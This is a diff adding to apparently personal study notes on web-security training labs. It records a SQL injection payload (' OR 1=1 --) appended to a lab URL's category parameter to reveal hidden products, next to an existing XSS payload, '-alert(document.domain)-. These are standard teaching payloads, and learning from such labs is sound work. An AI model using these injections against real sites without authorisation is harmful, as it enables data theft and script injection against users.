@@ -856,7 +856,15 @@ What ever you write ' and / is always appeared
 
 
 injection payload --> http://foo?'-alert(document.domain)-
+__________________________________________________________________________________________________________________________________________________________________
+SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+------------------------------------------------------------------------------
+https://0a2900cd031d3118804b0568001900d0.web-security-academy.net/filter?category=Accessories (original)
 
+We can also inject in value place --> 'OR 1=1 -- (It will show every data)
+
+https://0a2900cd031d3118804b0568001900d0.web-security-academy.net/filter?category=Accessories' OR 1=1 --
+__________________________________________________________________________________________________________________________________________________________________
 
 
 
